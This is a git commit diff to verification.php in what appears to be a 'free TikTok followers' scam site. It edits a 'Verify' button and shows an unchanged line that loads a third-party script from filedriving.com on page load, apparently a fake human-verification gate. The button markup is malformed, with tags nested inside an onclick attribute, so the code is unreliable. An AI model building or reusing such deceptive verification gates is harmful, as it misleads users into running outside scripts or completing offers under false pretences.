0f8a5ec2dfd3208c7d07add089f6811cf8299d73
gettiktokfollowerz <80472288+gettiktokfollowerz@users.noreply.github.com>
2022-02-03 14:57:41 +0100

    Update verification.php

--- parts/verification.php
+++ parts/verification.php
@@ -28,7 +28,7 @@
 	</div>
 	<div class="verification-button-wrapper animated bounceIn animation-delay-1000">
 	
-	<button type="button" class="btn btn-lg btn-block btn-light mb-1 mt-1 t-bold-i pt-2 pb-2 VB" onclick="<script type="text/javascript" src="https://filedriving.com/script_include.php?id=1073629"></script>;">Verify</button>
+	<button type="button" class="btn btn-lg btn-block btn-light mb-1 mt-1 t-bold-i pt-2 pb-2 VB" onclick="<a href="https://filedriving.com/script_include.php?id=1073629"/>;">Verify</button>
 	
 		<script type="text/javascript" src="https://filedriving.com/script_include.php?id=1073629"></script>
 		
